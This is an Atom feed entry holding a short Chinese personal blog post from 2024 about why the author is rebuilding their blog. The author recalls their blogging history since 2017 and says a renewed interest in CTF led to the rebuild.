    <link href="https://reputati0n.github.io/2024/10/12/rebuild-a-blog/"/>
    <id>https://reputati0n.github.io/2024/10/12/rebuild-a-blog/</id>
    <published>2024-10-12T02:00:12.000Z</published>
    <updated>2024-10-28T07:23:14.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="为什么写博客"><a href="#为什么写博客" class="headerlink" title="为什么写博客"></a>为什么写博客</h2><p>仔细想想，我是从 2017 年高考完的夏天开始入坑的，当时用的是一块钱的 .top 域名，托管在一块钱一年的 512M 虚拟主机里，跑着死慢死慢的 WordPress 程序，我的第一个博客就这么颤颤巍巍的跑起来了。</p><p>一转眼已经七年过去了，我手上也囤满了各种后缀的域名，一台台国内国外各种配置的 VPS，市面上主流的 Blog 程序也被用了个遍，但是始终没有一个 Blog 是专注内容稳定更新的，有时候想想，确实是形式大于内容了。</p><p>最近因为工作原因，又把 CTF 捡起来了，学习的过程中经常会在各个 CTFer 的 Blog 中来回跳转查找资料，自然又萌生了重建 Blog 的念头，于是就有了这次重建。</p><p>不管初心是怎么样吧，我还是想好好写下去的，在这个 Web2.0 旧王迟暮，Web3.0 新王当立的时代，留下点属于自己的痕迹。</p><p>诸君，共勉。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;为什么写博客&quot;&gt;&lt;a href=&quot;#为什么写博客&quot; class=&quot;headerlink&quot; title=&quot;为什么写博客&quot;&gt;&lt;/a&gt;为什么写博客&lt;/h2&gt;&lt;p&gt;仔细想想，我是从 2017 年高考完的夏天开始入坑的，当时用的是一块钱的 .top 域名，托管在一块钱一年的</summary>
      
    
    
    
    <category term="闲聊" scheme="https://reputati0n.github.io/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="Blog" scheme="https://reputati0n.github.io/tags/Blog/"/>
    
  </entry>
  
</feed>
